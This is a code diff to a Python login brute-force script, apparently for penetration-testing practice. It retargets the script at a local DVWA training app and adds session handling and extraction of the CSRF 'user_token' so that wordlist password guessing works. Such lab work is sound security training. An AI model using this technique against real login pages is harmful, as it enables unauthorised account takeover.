@@ -5,17 +5,30 @@ import logging
 logging.basicConfig(filename='pentest.log', level=logging.INFO)
 
 # Configuration
-target_url = 'http://example.com/login'
-username = 'admin'
-wordlist = 'passwords.txt'  # Path to your password list
+target_url = 'http://localhost/dvwa/login.php' 
+username = 'admin' 
+wordlist = 'passwords.txt' 
 
 def login_attempt(username, password):
     payload = {
         'username': username,
-        'password': password
+        'password': password,
+        'Login': 'Login'  # DVWA's login button name
     }
-    response = requests.post(target_url, data=payload)
+    # Include DVWA's session token in the request if required
+    session = requests.Session()
+    response = session.get(target_url)
+    payload['user_token'] = extract_user_token(response.text)
+    response = session.post(target_url, data=payload)
     return response
+
+def extract_user_token(html):
+    # Extract the user token from the login page
+    import re
+    match = re.search(r'user_token\' value=\'(.*?)\'', html)
+    if match:
+        return match.group(1)
+    return None
 
 def is_login_successful(response):
     # Define a success condition based on the response content
@@ -58,3 +71,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
